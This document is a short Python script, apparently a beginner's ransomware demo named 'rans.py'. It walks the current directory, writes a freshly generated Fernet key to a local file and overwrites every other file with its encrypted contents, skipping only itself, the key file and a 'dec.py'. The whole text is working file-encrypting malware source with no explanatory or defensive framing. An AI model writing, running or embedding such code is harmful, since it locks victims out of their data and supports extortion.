import os

from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "rans.py" or file == "thekey.key" or file=="dec.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)        

key = Fernet.generate_key()

with open("thekey.key","wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file,"rb") as thefile:
        cont = thefile.read()
    cont_en = Fernet(key).encrypt(cont)
    with open(file,"wb") as thefile:
        thefile.write(cont_en)
